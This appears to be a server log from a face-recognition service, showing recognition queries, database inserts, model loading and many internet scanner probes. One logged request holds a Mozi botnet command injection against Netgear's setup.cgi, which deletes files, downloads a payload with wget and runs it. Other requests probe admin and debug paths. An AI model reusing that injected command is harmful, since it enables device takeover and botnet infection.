2022-10-22 11:56:44.298 | DEBUG    | module.milvus_helpers:__init__:18 -  Successfully connect to MiLvus with IP: 0.0.0.0 and Port: 19530
INFO:     Started server process [3381944]
INFO:     Waiting for application startup.
INFO:     Application startup complete.
INFO:     Uvicorn running on http://0.0.0.0:8080 (Press CTRL+C to quit)
2022-10-22 11:57:12.269 | ERROR    | __main__:search:268 - Not face
box []
INFO:     123.24.206.26:58272 - "POST /recognize HTTP/1.1" 200 OK
2022-10-22 11:57:18.837 | ERROR    | __main__:search:268 - Not face
box []
INFO:     123.24.206.26:52467 - "POST /recognize HTTP/1.1" 200 OK
/media/ai-r-d/DATA1/Face_triton/service/face_service.py:274: DeprecationWarning: `np.int` is a deprecated alias for the builtin `int`. To silence this warning, use `int` by itself. Doing this will not modify any behavior and is safe. When replacing `np.int`, you may wish to use e.g. `np.int64` or `np.int32` to specify the precision. If you wish to review your current use, check the release note link for additional information.
Deprecated in NumPy 1.20; for more details and guidance: https://numpy.org/devdocs/release/1.20.0-notes.html#deprecations
  x1,y1,x2,y2,score = bbox.astype(np.int)
2022-10-22 11:58:08.348 | DEBUG    | module.milvus_helpers:search_vectors:161 - Successfully search in collection: ["['(distance: 296.844482421875, id: 436732162078934867)']"]
2022-10-22 11:58:08.348 | DEBUG    | module.mysql_helpers:search_by_milvus_ids:118 - MYSQL search by milvus id.
box [[108.770676 132.2422   465.30588  441.85596    0.626935]]
box [[108.770676 132.2422   465.30588  441.85596    0.626935]]
['(distance: 296.844482421875, id: 436732162078934867)']
('62846811f6f4201104b3af89', 'static/90ebbd7c4e8411ed904071c94499f8a6_62846811f6f4201104b3af89.jpg')
['static/90ebbd7c4e8411ed904071c94499f8a6_62846811f6f4201104b3af89.jpg']
['62846811f6f4201104b3af89']
[296.844482421875]
['static/90ebbd7c4e8411ed904071c94499f8a6_62846811f6f4201104b3af89.jpg']
time:  0.0749356746673584
id ['62846811f6f4201104b3af89']
distance [296.844482421875]
INFO:     123.24.206.26:57212 - "POST /recognize HTTP/1.1" 200 OK
2022-10-22 11:58:21.215 | DEBUG    | module.milvus_helpers:search_vectors:161 - Successfully search in collection: ["['(distance: 298.57794189453125, id: 436732162078934867)']"]
2022-10-22 11:58:21.215 | DEBUG    | module.mysql_helpers:search_by_milvus_ids:118 - MYSQL search by milvus id.
box [[146.21407   155.14565   478.73834   446.63867     0.7040156]]
box [[146.21407   155.14565   478.73834   446.63867     0.7040156]]
['(distance: 298.57794189453125, id: 436732162078934867)']
('62846811f6f4201104b3af89', 'static/90ebbd7c4e8411ed904071c94499f8a6_62846811f6f4201104b3af89.jpg')
['static/90ebbd7c4e8411ed904071c94499f8a6_62846811f6f4201104b3af89.jpg']
['62846811f6f4201104b3af89']
[298.57794189453125]
['static/90ebbd7c4e8411ed904071c94499f8a6_62846811f6f4201104b3af89.jpg']
time:  0.09029960632324219
id ['62846811f6f4201104b3af89']
distance [298.57794189453125]
INFO:     123.24.206.26:40999 - "POST /recognize HTTP/1.1" 200 OK
2022-10-22 11:59:09.775 | DEBUG    | module.milvus_helpers:search_vectors:161 - Successfully search in collection: ["['(distance: 273.011474609375, id: 436732162078941549)']"]
2022-10-22 11:59:09.775 | DEBUG    | module.mysql_helpers:search_by_milvus_ids:118 - MYSQL search by milvus id.
box [[142.18658   76.157776 492.80698  359.03577    0.643638]]
box [[142.18658   76.157776 492.80698  359.03577    0.643638]]
['(distance: 273.011474609375, id: 436732162078941549)']
('6284680ef6f4201104b3af75', 'static/2d4ceb3050df11ed833a4bc6a937cc45_6284680ef6f4201104b3af75.jpg')
['static/2d4ceb3050df11ed833a4bc6a937cc45_6284680ef6f4201104b3af75.jpg']
['6284680ef6f4201104b3af75']
[273.011474609375]
['static/2d4ceb3050df11ed833a4bc6a937cc45_6284680ef6f4201104b3af75.jpg']
time:  0.10545730590820312
id ['6284680ef6f4201104b3af75']
distance [273.011474609375]
INFO:     123.24.206.26:40748 - "POST /recognize HTTP/1.1" 200 OK
2022-10-24 17:36:47.913 | DEBUG    | module.mysql_helpers:search_by_milvus_ids:118 - MYSQL search by milvus id.
2022-10-24 17:36:47.914 | ERROR    | __main__:search:307 - list index out of range
box [[131.6152     125.9424     523.4973     473.13434      0.60004336]]
box [[131.6152     125.9424     523.4973     473.13434      0.60004336]]
['(distance: 272.5618591308594, id: 436732162078934129)']
[]
[]
[272.5618591308594]
[]
time:  0.05555987358093262
id []
distance [272.5618591308594]
INFO:     123.24.206.26:38165 - "POST /recognize HTTP/1.1" 200 OK
2022-10-24 17:36:56.655 | DEBUG    | module.milvus_helpers:search_vectors:161 - Successfully search in collection: ["['(distance: 296.19415283203125, id: 436732162078934129)']"]
2022-10-24 17:36:56.656 | DEBUG    | module.mysql_helpers:search_by_milvus_ids:118 - MYSQL search by milvus id.
2022-10-24 17:36:56.656 | ERROR    | __main__:search:307 - list index out of range
box [[135.4754    113.84361   485.7351    440.27386     0.6285279]]
box [[135.4754    113.84361   485.7351    440.27386     0.6285279]]
['(distance: 296.19415283203125, id: 436732162078934129)']
[]
[]
[296.19415283203125]
[]
time:  0.05813121795654297
id []
distance [296.19415283203125]
INFO:     123.24.206.26:44226 - "POST /recognize HTTP/1.1" 200 OK
2022-10-24 17:37:11.111 | DEBUG    | module.milvus_helpers:search_vectors:161 - Successfully search in collection: ["['(distance: 279.7430419921875, id: 436732162078934129)']"]
2022-10-24 17:37:11.112 | DEBUG    | module.mysql_helpers:search_by_milvus_ids:118 - MYSQL search by milvus id.
2022-10-24 17:37:11.112 | ERROR    | __main__:search:307 - list index out of range
box [[119.799484   119.52344    477.74152    447.82895      0.64648354]]
box [[119.799484   119.52344    477.74152    447.82895      0.64648354]]
['(distance: 279.7430419921875, id: 436732162078934129)']
[]
[]
[279.7430419921875]
[]
time:  0.054306745529174805
id []
distance [279.7430419921875]
INFO:     123.24.206.26:56811 - "POST /recognize HTTP/1.1" 200 OK
2022-10-24 17:37:19.000 | DEBUG    | module.milvus_helpers:search_vectors:161 - Successfully search in collection: ["['(distance: 237.49668884277344, id: 436732162078934129)']"]
2022-10-24 17:37:19.000 | DEBUG    | module.mysql_helpers:search_by_milvus_ids:118 - MYSQL search by milvus id.
2022-10-24 17:37:19.000 | ERROR    | __main__:search:307 - list index out of range
box [[149.45851   117.457825  483.7348    413.02496     0.7144941]]
box [[149.45851   117.457825  483.7348    413.02496     0.7144941]]
['(distance: 237.49668884277344, id: 436732162078934129)']
[]
[]
[237.49668884277344]
[]
time:  0.0538477897644043
id []
distance [237.49668884277344]
INFO:     123.24.206.26:64012 - "POST /recognize HTTP/1.1" 200 OK
2022-10-24 17:37:25.443 | DEBUG    | module.milvus_helpers:search_vectors:161 - Successfully search in collection: ["['(distance: 388.663818359375, id: 436732162078941549)']"]
2022-10-24 17:37:25.443 | DEBUG    | module.mysql_helpers:search_by_milvus_ids:118 - MYSQL search by milvus id.
box [[204.60739   119.6207    531.05475   407.09094     0.7259326]]
box [[204.60739   119.6207    531.05475   407.09094     0.7259326]]
['(distance: 388.663818359375, id: 436732162078941549)']
('6284680ef6f4201104b3af75', 'static/2d4ceb3050df11ed833a4bc6a937cc45_6284680ef6f4201104b3af75.jpg')
['static/2d4ceb3050df11ed833a4bc6a937cc45_6284680ef6f4201104b3af75.jpg']
['6284680ef6f4201104b3af75']
[388.663818359375]
['static/2d4ceb3050df11ed833a4bc6a937cc45_6284680ef6f4201104b3af75.jpg']
time:  0.054561614990234375
id ['6284680ef6f4201104b3af75']
distance [388.663818359375]
INFO:     123.24.206.26:47325 - "POST /recognize HTTP/1.1" 200 OK
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
INFO:     87.236.176.163:51201 - "GET / HTTP/1.1" 404 Not Found
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
INFO:     177.21.19.32:55764 - "GET / HTTP/1.1" 404 Not Found
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
2022-10-24 19:38:48.262 | DEBUG    | module.milvus_helpers:search_vectors:161 - Successfully search in collection: ["['(distance: 360.29852294921875, id: 436732162078937421)']"]
2022-10-24 19:38:48.262 | DEBUG    | module.mysql_helpers:search_by_milvus_ids:118 - MYSQL search by milvus id.
box [[122.40378    255.12762    393.78036    501.66772      0.79124415]]
box [[122.40378    255.12762    393.78036    501.66772      0.79124415]]
['(distance: 360.29852294921875, id: 436732162078937421)']
('626a1ca315e49f66d33d5c9f', 'static/b06f68ec4e8911ed904071c94499f8a6_626a1ca315e49f66d33d5c9f.jpg')
['static/b06f68ec4e8911ed904071c94499f8a6_626a1ca315e49f66d33d5c9f.jpg']
['626a1ca315e49f66d33d5c9f']
[360.29852294921875]
['static/b06f68ec4e8911ed904071c94499f8a6_626a1ca315e49f66d33d5c9f.jpg']
time:  0.08596038818359375
id ['626a1ca315e49f66d33d5c9f']
distance [360.29852294921875]
INFO:     123.24.206.26:45160 - "POST /recognize HTTP/1.1" 200 OK
2022-10-24 19:39:19.444 | DEBUG    | module.milvus_helpers:search_vectors:161 - Successfully search in collection: ["['(distance: 333.91693115234375, id: 436732162078937421)']"]
2022-10-24 19:39:19.444 | DEBUG    | module.mysql_helpers:search_by_milvus_ids:118 - MYSQL search by milvus id.
box [[233.6485     287.90994    407.0761     435.42184      0.68106735]]
box [[233.6485     287.90994    407.0761     435.42184      0.68106735]]
['(distance: 333.91693115234375, id: 436732162078937421)']
('626a1ca315e49f66d33d5c9f', 'static/b06f68ec4e8911ed904071c94499f8a6_626a1ca315e49f66d33d5c9f.jpg')
['static/b06f68ec4e8911ed904071c94499f8a6_626a1ca315e49f66d33d5c9f.jpg']
['626a1ca315e49f66d33d5c9f']
[333.91693115234375]
['static/b06f68ec4e8911ed904071c94499f8a6_626a1ca315e49f66d33d5c9f.jpg']
time:  0.0872659683227539
id ['626a1ca315e49f66d33d5c9f']
distance [333.91693115234375]
INFO:     123.24.206.26:39452 - "POST /recognize HTTP/1.1" 200 OK
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
INFO:     117.194.208.91:45476 - "GET / HTTP/1.1" 404 Not Found
INFO:     117.194.208.91:45477 - "GET / HTTP/1.1" 404 Not Found
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
INFO:     78.108.177.54:37974 - "GET / HTTP/1.0" 404 Not Found
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
INFO:     45.61.186.118:43024 - "GET /config/getuser?index=0 HTTP/1.1" 404 Not Found
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
INFO:     92.118.39.78:44374 - "GET / HTTP/1.1" 404 Not Found
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
INFO:     128.1.248.42:51320 - "GET / HTTP/1.1" 404 Not Found
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
INFO:     46.244.69.226:45824 - "GET / HTTP/1.1" 404 Not Found
INFO:     46.244.69.226:45825 - "GET / HTTP/1.1" 404 Not Found
INFO:     46.244.69.226:45826 - "GET / HTTP/1.1" 404 Not Found
INFO:     46.244.69.226:45823 - "GET / HTTP/1.1" 404 Not Found
INFO:     46.244.69.226:45822 - "GET / HTTP/1.1" 404 Not Found
INFO:     152.89.196.211:36490 - "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 404 Not Found
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
INFO:     47.87.225.110:53148 - "GET / HTTP/1.1" 404 Not Found
INFO:     47.87.225.110:36024 - "GET / HTTP/1.1" 404 Not Found
INFO:     152.89.196.211:42140 - "GET /actuator/gateway/routes HTTP/1.1" 404 Not Found
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
INFO:     185.163.47.8:63334 - "GET / HTTP/1.1" 404 Not Found
INFO:     185.163.47.8:63334 - "GET / HTTP/1.1" 404 Not Found
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
INFO:     162.62.191.231:17986 - "GET / HTTP/1.1" 404 Not Found
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
INFO:     209.141.36.231:37490 - "GET / HTTP/1.1" 404 Not Found
INFO:     209.141.36.231:37490 - "GET /favicon.ico HTTP/1.1" 404 Not Found
INFO:     209.141.33.65:34828 - "GET / HTTP/1.1" 404 Not Found
INFO:     209.141.33.65:34828 - "GET /favicon.ico HTTP/1.1" 404 Not Found
INFO:     209.141.41.193:35460 - "GET / HTTP/1.1" 404 Not Found
INFO:     209.141.41.193:35460 - "GET /favicon.ico HTTP/1.1" 404 Not Found
INFO:     209.141.55.120:57890 - "GET / HTTP/1.1" 404 Not Found
INFO:     209.141.55.120:57890 - "GET /favicon.ico HTTP/1.1" 404 Not Found
INFO:     209.141.49.169:18442 - "GET / HTTP/1.1" 404 Not Found
INFO:     209.141.49.169:18442 - "GET /favicon.ico HTTP/1.1" 404 Not Found
INFO:     205.185.116.25:29714 - "GET / HTTP/1.1" 404 Not Found
INFO:     205.185.116.25:29714 - "GET /favicon.ico HTTP/1.1" 404 Not Found
INFO:     209.141.34.187:48176 - "GET / HTTP/1.1" 404 Not Found
INFO:     209.141.34.187:48176 - "GET /favicon.ico HTTP/1.1" 404 Not Found
INFO:     209.141.34.187:57950 - "GET / HTTP/1.1" 404 Not Found
INFO:     209.141.34.187:57950 - "GET /favicon.ico HTTP/1.1" 404 Not Found
INFO:     209.141.36.112:57758 - "GET / HTTP/1.1" 404 Not Found
INFO:     209.141.36.112:57758 - "GET /favicon.ico HTTP/1.1" 404 Not Found
INFO:     209.141.41.193:45814 - "GET / HTTP/1.1" 404 Not Found
INFO:     209.141.41.193:45814 - "GET /favicon.ico HTTP/1.1" 404 Not Found
INFO:     205.185.116.25:10930 - "GET / HTTP/1.1" 404 Not Found
INFO:     205.185.116.25:10930 - "GET /favicon.ico HTTP/1.1" 404 Not Found
WARNING:  Invalid HTTP request received.
INFO:     209.141.41.193:55580 - "GET / HTTP/1.1" 404 Not Found
INFO:     209.141.41.193:55580 - "GET /favicon.ico HTTP/1.1" 404 Not Found
INFO:     205.185.116.25:14276 - "GET / HTTP/1.1" 404 Not Found
INFO:     205.185.116.25:14276 - "GET /favicon.ico HTTP/1.1" 404 Not Found
INFO:     209.141.49.169:29658 - "GET / HTTP/1.1" 404 Not Found
INFO:     209.141.49.169:29658 - "GET /favicon.ico HTTP/1.1" 404 Not Found
INFO:     209.141.35.128:48440 - "GET / HTTP/1.1" 404 Not Found
INFO:     209.141.35.128:48440 - "GET /favicon.ico HTTP/1.1" 404 Not Found
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
INFO:     198.235.24.170:57023 - "GET / HTTP/1.0" 404 Not Found
WARNING:  Invalid HTTP request received.
INFO:     92.118.39.78:44138 - "GET / HTTP/1.1" 404 Not Found
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
INFO:     193.142.146.35:37788 - "GET / HTTP/1.1" 404 Not Found
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
INFO:     176.58.124.134:56024 - "GET / HTTP/1.1" 404 Not Found
INFO:     128.14.134.134:54164 - "GET / HTTP/1.1" 404 Not Found
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
INFO:     167.248.133.45:45810 - "GET / HTTP/1.1" 404 Not Found
INFO:     167.248.133.45:42000 - "GET / HTTP/1.1" 404 Not Found
WARNING:  Invalid HTTP request received.
INFO:     47.87.225.110:47838 - "GET / HTTP/1.1" 404 Not Found
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
INFO:     123.24.206.26:56211 - "GET /manager/html HTTP/1.1" 404 Not Found
WARNING:  Invalid HTTP request received.
INFO:     71.6.232.28:50832 - "GET / HTTP/1.1" 404 Not Found
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
INFO:     123.24.206.26:51985 - "GET / HTTP/1.1" 404 Not Found
INFO:     123.24.206.26:43320 - "GET / HTTP/1.1" 404 Not Found
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
INFO:     198.55.106.201:35086 - "GET / HTTP/1.1" 404 Not Found
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
INFO:     46.174.191.32:38364 - "GET / HTTP/1.0" 404 Not Found
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
INFO:     198.235.24.55:65286 - "GET / HTTP/1.1" 404 Not Found
INFO:     205.210.31.128:63560 - "GET / HTTP/1.1" 404 Not Found
INFO:     123.24.206.26:53438 - "GET / HTTP/1.1" 404 Not Found
INFO:     123.24.206.26:59288 - "GET / HTTP/1.1" 404 Not Found
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
INFO:     120.85.94.54:11148 - "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 Not Found
WARNING:  Invalid HTTP request received.
INFO:     185.163.47.8:62285 - "GET / HTTP/1.1" 404 Not Found
INFO:     185.163.47.8:62285 - "GET / HTTP/1.1" 404 Not Found
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
INFO:     205.210.31.180:64934 - "GET / HTTP/1.1" 404 Not Found
INFO:     183.224.118.113:50348 - "GET /manager/html HTTP/1.1" 404 Not Found
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
INFO:     198.235.24.56:60696 - "GET / HTTP/1.1" 404 Not Found
INFO:     198.235.24.42:63786 - "GET / HTTP/1.1" 404 Not Found
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
INFO:     198.235.24.50:62576 - "GET / HTTP/1.1" 404 Not Found
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
INFO:     198.235.24.156:64890 - "GET / HTTP/1.1" 404 Not Found
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
INFO:     205.210.31.15:58302 - "GET / HTTP/1.1" 404 Not Found
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
INFO:     192.241.218.5:44428 - "GET / HTTP/1.1" 404 Not Found
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
INFO:     192.241.218.54:42204 - "GET / HTTP/1.1" 404 Not Found
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
INFO:     198.235.24.132:60662 - "GET / HTTP/1.1" 404 Not Found
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
INFO:     205.210.31.166:60070 - "GET / HTTP/1.1" 404 Not Found
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
INFO:     45.61.186.118:49422 - "GET /config/getuser?index=0 HTTP/1.1" 404 Not Found
2022-10-25 07:47:16.358 | DEBUG    | module.mysql_helpers:show_image:92 - Mysql search by image: ['62fc7496422ac27d7b64d8bc']
INFO:     123.24.206.26:49064 - "POST /showimage HTTP/1.1" 200 OK
INFO:     118.70.171.10:44335 - "GET /423f89844e8811ed904071c94499f8a6_62fc7496422ac27d7b64d8bc.jpg HTTP/1.1" 200 OK
2022-10-25 07:47:31.835 | DEBUG    | module.milvus_helpers:insert:80 - Insert vectors to Milvus in collection: _2090App with 2 rows in collection: _2090App
2022-10-25 07:47:34.859 | DEBUG    | module.milvus_helpers:create_index:103 - Successfully create index in collection:_2090App with param:{'index_type': 'IVF_FLAT', 'metric_type': 'L2', 'params': {'nlist': 16384}}
2022-10-25 07:47:34.859 | DEBUG    | module.mysql_helpers:create_mysql_table:51 - MYSQL create table: _2090App with sql: create table if not exists _2090App(milvus_id TEXT, person_id TEXT, image_path TEXT );
2022-10-25 07:47:34.869 | DEBUG    | module.mysql_helpers:load_data_to_mysql:66 - MYSQL loads data to table: _2090App successfully
2022-10-25 07:47:39.060 | DEBUG    | module.milvus_helpers:insert:80 - Insert vectors to Milvus in collection: _2090App with 2 rows in collection: _2090App
2022-10-25 07:47:42.585 | DEBUG    | module.milvus_helpers:create_index:103 - Successfully create index in collection:_2090App with param:{'index_type': 'IVF_FLAT', 'metric_type': 'L2', 'params': {'nlist': 16384}}
2022-10-25 07:47:42.586 | DEBUG    | module.mysql_helpers:create_mysql_table:51 - MYSQL create table: _2090App with sql: create table if not exists _2090App(milvus_id TEXT, person_id TEXT, image_path TEXT );
2022-10-25 07:47:42.596 | DEBUG    | module.mysql_helpers:load_data_to_mysql:66 - MYSQL loads data to table: _2090App successfully
2022-10-25 07:47:42.596 | INFO     | __main__:insert:224 - Masked id [436732162078946188], Non mask id [436732162078946174]
Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
find model: /media/ai-r-d/DATA1/Face_triton/weights/models/antelopev2/1k3d68.onnx landmark_3d_68 ['None', 3, 192, 192] 0.0 1.0
Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
model ignore: /media/ai-r-d/DATA1/Face_triton/weights/models/antelopev2/2d106det.onnx landmark_2d_106
Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
model ignore: /media/ai-r-d/DATA1/Face_triton/weights/models/antelopev2/genderage.onnx genderage
Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
model ignore: /media/ai-r-d/DATA1/Face_triton/weights/models/antelopev2/glintr100.onnx recognition
Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
find model: /media/ai-r-d/DATA1/Face_triton/weights/models/antelopev2/scrfd_10g_bnkps.onnx detection [1, 3, '?', '?'] 127.5 128.0
set det-size: (128, 128)
save done
[[0.988189]]
path image static/992efa7453fe11ed89ee4566cb1fc398_62fc7496422ac27d7b64d8bc.jpg
Applied providers: ['CPUExecutionProvider'], with options: {'CPUExecutionProvider': {}}
